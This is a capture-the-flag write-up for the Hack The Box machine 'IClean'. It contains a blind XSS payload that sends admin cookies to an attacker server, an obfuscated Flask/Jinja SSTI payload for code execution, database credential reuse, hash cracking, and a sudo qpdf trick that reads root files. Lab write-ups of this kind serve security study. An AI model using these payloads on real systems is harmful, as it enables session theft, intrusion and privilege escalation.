# IClean

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

## Port scan

```bash
└─➜ nmap -p22,80 $IP -sCV                                                                                                                                                                 [0]
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-08 21:55 IST
Nmap scan report for capiclean.htb (10.129.43.189)
Host is up (0.38s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Capiclean
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.3.7 Python/3.10.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.43 seconds
```

* Directory scan wasn't that imp on this machine (so skipping it)

## Web -> XSS

![image](https://gist.github.com/assets/56447720/9603e459-2368-4d3f-ac06-b794210d0b77)

Give dummy data and click on submit, after submitting we can see that there's a message "team will get back to you"

![image](https://gist.github.com/assets/56447720/2f04d4ba-0984-4893-8072-ecfefe5c7eaf)

Hmm, feel like XSS, (BLIND XSS)

* Blind XSS

We can send a payload and wait for the admin to view our response and we can get their cookies.

* Payload

```js
<img src=x onerror=fetch("http://IP:PORT/"+document.cookie);>
```

* Response

```js
└─➜ python3 -m http.server 9001          
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.129.43.189 - - [08/Apr/2024 22:13:40] code 404, message File not found
10.129.43.189 - - [08/Apr/2024 22:13:40] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk <<SNIP>> ODk0YTRdDBh9dWK-w5cJYTlg HTTP/1.1" 404 -

```

And now we are admin

![image](https://gist.github.com/assets/56447720/1bfe2f2e-850c-47e0-8807-d7b5eb9e56ca)

## Web -> SSTI

AAAHHH, the website is build with python flask, the first bug i can thought of is SSTI.

![image](https://gist.github.com/assets/56447720/29d31fe3-e6bc-4dce-b50b-9af840681a2b)

* The invoice generator is vulnerable to SSTI

![image](https://gist.github.com/assets/56447720/bfee3a1b-841b-4420-9b44-904bbb058908)

#### SSTI -> RCE

![image](https://gist.github.com/assets/56447720/6368cc9a-68aa-4c18-9fae-1d7f1534aa9f)

* Encode the payload to base64 and send it to the server

```py
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

```

![image](https://gist.github.com/assets/56447720/6b5b422a-1dfd-4866-9fa1-cc3e5675458d)

## www -> User

* we have found db creds

```py
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}

```

* I used mysql cli to view data from the db

```bash
www-data@iclean:/opt/app$ mysql -u iclean -ppxCsmnGLckUb -D capiclean  -e "show tables;"
mysql -u iclean -ppxCsmnGLckUb -D capiclean  -e "show tables;"
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_capiclean
quote_requests
services
users

www-data@iclean:/opt/app$ mysql -u iclean -ppxCsmnGLckUb -D capiclean  -e "select * from users;"
mysql -u iclean -ppxCsmnGLckUb -D capiclean  -e "select * from users"
mysql: [Warning] Using a password on the command line interface can be insecure.
id      username        password        role_id
1       admin   2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51        21232f297a57a5a743894a0e4a801fc3
2       consuela        0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa        ee11cbb19052e40b07aac0ca060c23ee

```

The reason i choose to use mysql cli is because the tty session of rev shell is not good to handle sql data, it doesn't work better basically

* Crack the hash

```bash
└─# hashcat -a 0 -m 1400  iclean-consuela.hash ../wordlists/rockyou.txt
hashcat (v6.2.6) starting
<<SNIP>>

Dictionary cache built:
* Filename..: ../wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:<<REDACTED>>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494da...6927aa
<<SNIP>>

Started: Mon Apr  8 17:41:28 2024
Stopped: Mon Apr  8 17:41:33 2024
```

## User -> root

* Login with ssh and get user.txt

#### Sudo -l

```bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela:
Sorry, try again.
[sudo] password for consuela:
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf

```

* Documentation

{% embed url="https://qpdf.readthedocs.io/en/stable/cli.html" %}

```bash
consuela@iclean:/tmp$ sudo qpdf --empty --add-attachment /root/root.txt -- pwn.pdf
consuela@iclean:/tmp$ file test.pdf
test.pdf: PDF document, version 1.3, 0 pages
```

After we bring pwn.pdf in our local machine (through, scp, python3 server) we can get contents of root.txt

You can take id\_rsa in order to get root shell on the box.

Machine pwned!!

## \_\_\_\_heapbytes still pwning

